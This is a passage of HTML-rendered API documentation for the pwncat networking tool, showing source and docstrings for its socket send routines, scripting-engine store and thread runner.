        conns[conn.family][<span class="hljs-string">"remote_addr"</span>] = client[<span
                                            class="hljs-number">0</span>]
        conns[conn.family][<span class="hljs-string">"remote_port"</span>] = client[<span
                                            class="hljs-number">1</span>]
    <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> err:
        remove = {family: str(err) <span class="hljs-keyword">for</span> family <span
                                            class="hljs-keyword">in</span> conns}
    <span class="hljs-comment"># On error, remove all bind sockets</span>
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
        self.__log.debug(
            <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
            family,
            self.__sock.get_family_name(family),
            remove[family],
        )
        self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
        <span class="hljs-keyword">del</span> conns[family]
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># (3/3) Store connections</span>
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
        <span class="hljs-keyword">if</span> <span class="hljs-string">"conn"</span> <span
                                            class="hljs-keyword">in</span> conns[family]:
            self.__active = {
                <span class="hljs-string">"af"</span>: family,
                <span class="hljs-string">"conn"</span>: conns[family][<span class="hljs-string">"conn"</span>],
                <span class="hljs-string">"remote_addr"</span>: conns[family][<span
                                            class="hljs-string">"remote_addr"</span>],
                <span class="hljs-string">"remote_port"</span>: conns[family][<span
                                            class="hljs-string">"remote_port"</span>],
            }
            <span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> self.__sock.get_sock_opts(self.__active[<span
                                            class="hljs-string">"conn"</span>], self.__options.info):
                self.__log.info(<span class="hljs-string">"[%s] %s"</span>, self.__sock.get_family_name(family), info)
    self.__conns = conns
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Net.send"><code class="name flex">
                            <span>def <span
                                    class="ident">send</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Send data through a connected (TCP) or unconnected
                                (UDP) socket.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>data</code></strong> :<code>bytes</code></dt>
                                    <dd>The data to send.</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>int</code></dt>
                                    <dd>Returns total bytes sent.</dd>
                                </dl>
                                <h2 id="raises">Raises</h2>
                                <dl>
                                    <dt><code>socket.error</code></dt>
                                    <dd>Except here when unconnected or connection was forcibly
                                        closed.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">send</span>(<span
                                        class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; int</span>
    <span class="hljs-string">"""Send data through a connected (TCP) or unconnected (UDP) socket.

    Args:
        data (bytes): The data to send.

    Returns:
        int: Returns total bytes sent.

    Raises:
        socket.error:   Except here when unconnected or connection was forcibly closed.
    """</span>
    <span class="hljs-comment"># UDP has some specialities as its socket is unconnected.</span>
    <span class="hljs-comment"># See also recv() for specialities on that side.</span>

    <span class="hljs-comment"># In case of sending data to an UDP client, we need to initially wait</span>
    <span class="hljs-comment"># until the client has first connected and told us its addr/port.</span>
    <span class="hljs-keyword">if</span> self.__udp_mode_server:
        <span class="hljs-comment"># self.__active will be set in recv() by another thread</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__active:
            self.__log.warning(<span class="hljs-string">"UDP client has not yet connected. Queueing message"</span>)
            <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.__active:
                <span class="hljs-keyword">if</span> self.__ssig.has_sock_quit():
                    self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"SOCK-QUIT signal ACK in Net.send (while waiting for UDP client)"</span>
                    )
                    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>
                time.sleep(<span class="hljs-number">0.01</span>)

    curr = <span class="hljs-number">0</span>  <span class="hljs-comment"># bytes send during one loop iteration</span>
    send = <span class="hljs-number">0</span>  <span class="hljs-comment"># total bytes send</span>
    size = len(data)  <span class="hljs-comment"># bytes of data that needs to be send</span>

    <span class="hljs-comment"># Loop until all bytes have been send</span>
    <span class="hljs-keyword">while</span> send &lt; size:
        self.__log.debug(
            <span class="hljs-string">"Trying to send %d bytes to %s:%d"</span>,
            size - send,
            self.__active[<span class="hljs-string">"remote_addr"</span>],
            self.__active[<span class="hljs-string">"remote_port"</span>],
        )
        self.__log.trace(<span class="hljs-string">"Trying to send: %s"</span>, repr(data))  <span
                                            class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Only UDP server has not made a connect() to the socket, all others</span>
            <span class="hljs-comment"># are already connected and need to use send() instead of sendto()</span>
            <span class="hljs-keyword">if</span> self.__udp_mode_server:
                curr = self.__active[<span class="hljs-string">"conn"</span>].sendto(
                    data, (self.__active[<span class="hljs-string">"remote_addr"</span>], self.__active[<span
                                            class="hljs-string">"remote_port"</span>])
                )
                send += curr
            <span class="hljs-keyword">else</span>:
                curr = self.__active[<span class="hljs-string">"conn"</span>].send(data)
                send += curr
            <span class="hljs-keyword">if</span> curr == <span class="hljs-number">0</span>:
                self.__log.error(<span class="hljs-string">"No bytes send during loop round."</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
            <span class="hljs-comment"># Remove 'curr' many bytes from byte for the next round</span>
            data = data[curr:]
            self.__log.debug(
                <span class="hljs-string">"Sent %d bytes to %s:%d (%d bytes remaining)"</span>,
                curr,
                self.__active[<span class="hljs-string">"remote_addr"</span>],
                self.__active[<span class="hljs-string">"remote_port"</span>],
                size - send,
            )
        <span class="hljs-keyword">except</span> (IOError, OSError, socket.error) <span
                                            class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Socket send Error: {}"</span>.format(error)
            <span class="hljs-keyword">raise</span> socket.error(msg)
    <span class="hljs-keyword">return</span> send</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Net.send_eof"><code class="name flex">
                            <span>def <span class="ident">send_eof</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Close the active socket for sending. The remote
                                part will get an EOF.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">send_eof</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Close the active socket for sending. The remote part will get an EOF."""</span>
    self.__sock.shutdown_send(self.__active[<span class="hljs-string">"conn"</span>], <span
                                            class="hljs-string">"conn"</span>)</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.PSEStore"><code class="flex name class">
                    <span>class <span class="ident">PSEStore</span></span>
                    <span>(</span><span>ssig, net)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Pwncats Scripting Engine store to persist and exchange data
                        for send/recv scripts.</p>
                        <p>The same instance of this class will be available to your send and
                            receive scripts
                            that allow you to exchange data or manipulate themselves. You even have
                            access to the
                            currently used instance of the networking class to manipulate the active
                            socket.
                            As well as to the logger and InterruptHandler instances.</p>
                        <p>Instantiate the PSE class.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>ssig</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>
                            </dt>
                            <dd>Instance InterruptHandler.</dd>
                            <dt><strong><code>net</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetwork"
                                    title="pwncat.IONetwork">IONetwork</a></code>
                            </dt>
                            <dd>Instance of the current network class to manipulate the socket.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span
                                class="hljs-title">PSEStore</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Pwncats Scripting Engine store to persist and exchange data for send/recv scripts.

    The same instance of this class will be available to your send and receive scripts
    that allow you to exchange data or manipulate themselves. You even have access to the
    currently used instance of the networking class to manipulate the active socket.
    As well as to the logger and InterruptHandler instances.
    """</span>

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">messages</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Dict[str, List[bytes]]</span>
        <span class="hljs-string">"""`Dict[str, List[bytes]]`: Stores sent and received messages by its thread name."""</span>
        <span class="hljs-keyword">return</span> self.__messages

<span class="hljs-meta">    @messages.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">messages</span>(<span
            class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (Dict[str, List[bytes]]) -&gt; None</span>
        self.__messages = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">store</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Any</span>
        <span class="hljs-string">"""`Any`: Custom data store to be used in PSE scripts to persist your data between calls."""</span>
        <span class="hljs-keyword">return</span> self.__store

<span class="hljs-meta">    @store.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">store</span>(<span class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (Any) -&gt; None</span>
        self.__store = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
        <span class="hljs-string">"""`InterruptHandler`: Instance of InterruptHandler class."""</span>
        <span class="hljs-keyword">return</span> self.__ssig

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">net</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[IONetwork]</span>
        <span class="hljs-string">"""`IONetwork`: List of active IONetwork instances (client or server)."""</span>
        <span class="hljs-keyword">return</span> self.__net

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; logging.Logger</span>
        <span class="hljs-string">"""`Logging.logger`: Instance of Logging.logger class."""</span>
        <span class="hljs-keyword">return</span> self.__log

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig, net</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler, List[IONetwork]) -&gt; None</span>
        <span class="hljs-string">"""Instantiate the PSE class.

        Args:
            ssig (InterruptHandler): Instance InterruptHandler.
            net (IONetwork): Instance of the current network class to manipulate the socket.
        """</span>
        self.__messages = {}
        self.__store = <span class="hljs-literal">None</span>
        self.__ssig = ssig
        self.__net = net
        self.__log = logging.getLogger(__name__)</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.PSEStore.log"><code class="name">var <span
                                class="ident">log</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>Logging.logger</code>: Instance of
                                Logging.logger class.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; logging.Logger</span>
    <span class="hljs-string">"""`Logging.logger`: Instance of Logging.logger class."""</span>
    <span class="hljs-keyword">return</span> self.__log</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.PSEStore.messages"><code class="name">var <span
                                class="ident">messages</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>Dict[str, List[bytes]]</code>: Stores sent
                                and received messages by its thread name.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">messages</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Dict[str, List[bytes]]</span>
    <span class="hljs-string">"""`Dict[str, List[bytes]]`: Stores sent and received messages by its thread name."""</span>
    <span class="hljs-keyword">return</span> self.__messages</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.PSEStore.net"><code class="name">var <span
                                class="ident">net</span></code></dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetwork"
                                    title="pwncat.IONetwork">IONetwork</a></code>:
                                List of active IONetwork instances (client or server).</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">net</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; List[IONetwork]</span>
    <span class="hljs-string">"""`IONetwork`: List of active IONetwork instances (client or server)."""</span>
    <span class="hljs-keyword">return</span> self.__net</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.PSEStore.ssig"><code class="name">var <span class="ident">ssig</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>:
                                Instance of InterruptHandler class.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
    <span class="hljs-string">"""`InterruptHandler`: Instance of InterruptHandler class."""</span>
    <span class="hljs-keyword">return</span> self.__ssig</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.PSEStore.store"><code class="name">var <span class="ident">store</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p><code>Any</code>: Custom data store to be used in
                                PSE scripts to persist your data between calls.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">store</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Any</span>
    <span class="hljs-string">"""`Any`: Custom data store to be used in PSE scripts to persist your data between calls."""</span>
    <span class="hljs-keyword">return</span> self.__store</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.Runner"><code class="flex name class">
                    <span>class <span class="ident">Runner</span></span>
                    <span>(</span><span>ssig, fast_quit, pse)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Runner class that takes care about putting everything into
                        threads.</p>
                        <p>Create a new Runner object.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>ssig</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>
                            </dt>
                            <dd>Instance of InterruptHandler.</dd>
                            <dt><strong><code>fast_quit</code></strong> :<code>boo</code></dt>
                            <dd>On <code>True</code> do not join threads upon exit, just raise
                                terminate and exit.
                            </dd>
                            <dt><strong><code>pse</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.PSEStore"
                                    title="pwncat.PSEStore">PSEStore</a></code>
                            </dt>
                            <dd>Pwncat Scripting Engine store.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span
                                class="hljs-title">Runner</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Runner class that takes care about putting everything into threads."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig, fast_quit, pse</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler, bool, PSEStore) -&gt; None</span>
        <span class="hljs-string">"""Create a new Runner object.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            fast_quit (boo): On `True` do not join threads upon exit, just raise terminate and exit.
            pse (PSEStore): Pwncat Scripting Engine store.
        """</span>
        self.log = logging.getLogger(__name__)

        <span class="hljs-comment"># Dict of producer/consumer action to run in a thread.</span>
        <span class="hljs-comment"># Each list item will be run in its own thread</span>
        self.__actions = {}  <span class="hljs-comment"># type: Dict[str, DsRunnerAction]</span>

        <span class="hljs-comment"># Dict of timed function definition to run in a thread.</span>
        <span class="hljs-comment"># Each list item will be run in its own thread.</span>
        self.__timers = {}  <span class="hljs-comment"># type: Dict[str, DsRunnerTimer]</span>

        <span class="hljs-comment"># Dict of repeater function definition to run in a thread.</span>
        <span class="hljs-comment"># Each list item will be run in its own thread.</span>
        self.__repeaters = {}  <span class="hljs-comment"># type: Dict[str, DsRunnerRepeater]</span>

        <span class="hljs-comment"># A dict which holds the threads created from actions.</span>
        <span class="hljs-comment"># The name is based on the __actions name</span>
        <span class="hljs-comment"># {"name": "&lt;thread&gt;"}</span>
        self.__threads = {}  <span class="hljs-comment"># type: Dict[str, threading.Thread]</span>

        self.__ssig = ssig
        self.__fast_quit = fast_quit
        self.__pse = pse

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_action</span>(<span
            class="hljs-params">self, name, action</span>):</span>
        <span class="hljs-comment"># type: (str, DsRunnerAction) -&gt; None</span>
        <span class="hljs-string">"""Add a function to the producer/consumer thread pool runner.

        Args:
            name (str): The name for the added action (will be used for logging the tread name).
            action (DsRunnerAction): Instance of DSRunnerAction.
        """</span>
        self.__actions[name] = action

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_timer</span>(<span
            class="hljs-params">self, name, timer</span>):</span>
        <span class="hljs-comment"># type: (str, DsRunnerTimer) -&gt; None</span>
        <span class="hljs-string">"""Add a function to the timer thread pool runner.

        Args:
            name (str): The name for the added timer (will be used for logging the thread name).
            timer (DsRunnerTimer): Instance of DsRunnerTimer.
        """</span>
        self.__timers[name] = timer

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_repeater</span>(<span
            class="hljs-params">self, name, repeater</span>):</span>
        <span class="hljs-comment"># type: (str, DsRunnerRepeater) -&gt; None</span>
        <span class="hljs-string">"""Add a function to the repeater thread pool runner.

        Args:
            name (str): The name for the added repeater (will be used for logging the thread name).
            repeater (DsRunnerRepeater): Instance of DsRunnerRepeater.
        """</span>
        self.__repeaters[name] = repeater

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Run threaded pwncat I/O modules."""</span>

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_action</span>(<span
                class="hljs-params">
            name,  <span class="hljs-comment"># type: str</span>
            producer,  <span class="hljs-comment"># type: DsCallableProducer</span>
            consumer,  <span class="hljs-comment"># type: Callable[[bytes], None]</span>
            transformers,  <span class="hljs-comment"># type: List[Transform]</span>
            code,  <span class="hljs-comment"># type: Optional[Union[str, bytes, CodeType]]</span>
        </span>):</span>
            <span class="hljs-comment"># type: (...) -&gt; None</span>
            <span class="hljs-string">"""Producer/consumer run function to be thrown into a thread.

            Args:
                name (str): Name for logging output.
                producer (function): A generator function which yields data.
                consumer (function): A callback which consumes data from the generator.
                transformers ([function]): List of transformer functions applied before consumer.
                code (ast.AST): User-supplied python code with a transform(data) -&gt; str function.
            """</span>
            self.log.trace(<span class="hljs-string">"[%s] Producer Start"</span>, name)  <span
                                    class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> producer.function(*producer.args, **producer.kwargs):
                self.log.trace(<span class="hljs-string">"[%s] Producer received: %s"</span>, name, repr(data))  <span
                                    class="hljs-comment"># type: ignore</span>

                <span class="hljs-comment"># [1/3] Transform data before sending it to the consumer</span>
                <span class="hljs-keyword">if</span> transformers:
                    <span class="hljs-keyword">for</span> transformer <span
                                    class="hljs-keyword">in</span> transformers:
                        data = transformer.transform(data)
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"[%s] Producer data after transformers: %s"</span>, name, repr(data)
                    )

                <span class="hljs-comment"># [2/3] Apply custom user-supplied code transformations</span>
                <span class="hljs-keyword">if</span> code <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
                    self.log.debug(
                        <span class="hljs-string">"[%s] Executing user supplied transform(data, pse) -&gt; data function"</span>, name
                    )
                    pse = self.__pse
                    <span class="hljs-comment"># Add current message to PSE store</span>
                    <span class="hljs-keyword">if</span> name <span class="hljs-keyword">in</span> self.__pse.messages:
                        self.__pse.messages[name] = self.__pse.messages[name] + [data]
                    <span class="hljs-keyword">else</span>:
                        self.__pse.messages[name] = [data]
                    <span class="hljs-comment"># Execute script code</span>
                    exec(code, {}, locals())  <span
                                    class="hljs-comment"># pylint: disable=exec-used</span>
                    data = locals()[<span class="hljs-string">"transform"</span>](data, pse)

                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"[%s] Producer data after user supplied transformer: %s"</span>, name, repr(data)
                    )

                <span class="hljs-comment"># [3/3] Consume it</span>
                consumer(data)
            self.log.trace(<span class="hljs-string">"[%s] Producer Stop"</span>, name)  <span
                                    class="hljs-comment"># type: ignore</span>

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_timer</span>(<span
                class="hljs-params">name, action, intvl, ssig, *args, **kwargs</span>):</span>
            <span class="hljs-comment"># type: (str, Callable[..., None], int, InterruptHandler, Any, Any) -&gt; None</span>
            <span class="hljs-string">"""Timer run function to be thrown into a thread (Execs periodic tasks).

            Args:
                name (str):        Name for logging output
                action (function): Function to be called in a given intervall
                intvl (float):     Intervall at which the action function will be called
                ssig (InterruptHandler): Instance of InterruptHandler
                args (*args):      *args for action func
                kwargs (**kwargs): **kwargs for action func
            """</span>
            self.log.trace(<span class="hljs-string">"[%s] Timer Start (exec every %f sec)"</span>, name, intvl)  <span
                                    class="hljs-comment"># type: ignore</span>
            time_last = int(time.time())
            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
                <span class="hljs-keyword">if</span> ssig.has_terminate():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"TERMINATE signal ACK for timer action [%s]"</span>, name
                    )
                    <span class="hljs-keyword">return</span>
                time_now = int(time.time())
                <span class="hljs-keyword">if</span> time_now &gt; time_last + intvl:
                    self.log.debug(<span class="hljs-string">"[%s] Executing timed function"</span>, time_now)
                    action(*args, **kwargs)
                    time_last = time_now  <span class="hljs-comment"># Reset previous time</span>
                time.sleep(<span class="hljs-number">0.1</span>)

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_repeater</span>(<span
                class="hljs-params">name, action, repeat, pause, ssig, *args, **kwargs</span>):</span>
            <span class="hljs-comment"># type: (str, Callable[..., None], int, float, InterruptHandler, Any, Any) -&gt; None</span>
            <span class="hljs-string">"""Repeater run function to be thrown into a thread (Execs periodic tasks).

            Args:
                name (str):        Name for logging output
                action (function): Function to be called
                repeat (int):      Repeat the function so many times before quitting
                pause (float):     Pause between repeated calls
                ssig (InterruptHandler): Instance of InterruptHandler
                args (*args):      *args for action func
                kwargs (**kwargs): **kwargs for action func
            """</span>
            cycles = <span class="hljs-number">1</span>
            self.log.trace(<span class="hljs-string">"Repeater Start (%d/%d)"</span>, cycles, repeat)  <span
                                    class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">while</span> cycles &lt;= repeat:
                <span class="hljs-keyword">if</span> ssig.has_terminate():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"TERMINATE signal ACK for repeater action [%s]"</span>, name
                    )
                    <span class="hljs-keyword">return</span>
                self.log.debug(<span
                                    class="hljs-string">"Executing repeated function (%d/%d)"</span>, cycles, repeat)
                action(*args, **kwargs)
                cycles += <span class="hljs-number">1</span>
                time.sleep(pause)

        <span class="hljs-comment"># [1/3] Start available action in a thread</span>
        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__actions:
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for Runner.run [1]: [%s]"</span>, key)  <span
                                    class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">break</span>
            <span class="hljs-comment"># Create Thread object</span>
            thread = threading.Thread(
                target=run_action,
                name=key,
                args=(
                    key,
                    self.__actions[key].producer,
                    self.__actions[key].consumer,
                    self.__actions[key].transformers,
                    self.__actions[key].code,
                ),
            )
            <span class="hljs-comment"># Daemon threads are easier to kill</span>
            thread.daemon = self.__actions[key].daemon_thread

            <span class="hljs-comment"># Add delay if threads cannot be started</span>
            delay = <span class="hljs-number">0.0</span>
            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
                <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"TERMINATE signal ACK for Runner.run [2]: [%s]"</span>, key
                    )
                    <span class="hljs-keyword">break</span>
                <span class="hljs-keyword">try</span>:
                    <span class="hljs-comment"># Do not call any logging functions in here as it will</span>
                    <span class="hljs-comment"># cause a deadlock for Python2</span>
                    <span class="hljs-comment"># Start and break the loop upon success to go to the next thread to start</span>
                    thread.start()
                    <span class="hljs-keyword">break</span>
                <span class="hljs-keyword">except</span> (RuntimeError, Exception):  <span
                                    class="hljs-comment"># pylint: disable=broad-except</span>
                    delay += <span class="hljs-number">0.1</span>
                    time.sleep(delay)  <span class="hljs-comment"># Give the system some time to release open fd's</span>
            self.__threads[key] = thread

        <span class="hljs-comment"># [2/3] Start available timers in a thread</span>
        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__timers:
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for Runner.run [2]: [%s]"</span>, key)  <span
                                    class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">break</span>
            <span class="hljs-comment"># Create Thread object</span>
            thread = threading.Thread(
                target=run_timer,
                name=key,
                args=(
                    key,
                    self.__timers[key].action,
                    self.__timers[key].intvl,
                    self.__timers[key].ssig,
                )
                + self.__timers[key].args,
                kwargs=self.__timers[key].kwargs,
            )
            thread.daemon = <span class="hljs-literal">False</span>
            thread.start()

        <span class="hljs-comment"># [3/3] Start available repeaters in a thread</span>
        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__repeaters:
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for Runner.run [3]: [%s]"</span>, key)  <span
                                    class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">break</span>
            <span class="hljs-comment"># Create Thread object</span>
            thread = threading.Thread(
                target=run_repeater,
                name=key,
                args=(
                    key,
                    self.__repeaters[key].action,
                    self.__repeaters[key].repeat,
                    self.__repeaters[key].pause,
                    self.__repeaters[key].ssig,
                )
                + self.__repeaters[key].args,
                kwargs=self.__repeaters[key].kwargs,
            )
            thread.daemon = <span class="hljs-literal">False</span>
            thread.start()

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_stop</span>():</span>
            <span class="hljs-comment"># type: () -&gt; bool</span>
            <span class="hljs-string">"""Stop threads."""</span>
            <span class="hljs-comment"># [1/2] Fast shutdown</span>
            <span class="hljs-comment"># For Python &lt; 3.3 we are unable to detect Ctrl+c signal during thread.join()</span>
            <span class="hljs-comment"># in a fast loop. Also for port-scan we will have thousands of threads that need</span>
            <span class="hljs-comment"># to be joined and the signal handler is unable to abort the whole program during that</span>
            <span class="hljs-comment"># time. Outcome is it would take a few minutes to abort during port scan.</span>
            <span class="hljs-comment"># The fix is to use a "faster" method to kill the threads.</span>
            <span class="hljs-comment"># 1. The port scanner threads need to be started in daemon mode</span>
            <span class="hljs-comment"># 2. the fast_quit param to Runner() must be set to True</span>
            <span class="hljs-keyword">if</span> self.__fast_quit:
                <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                    self.log.trace(<span
                                    class="hljs-string">"Fast quit - shutting down."</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
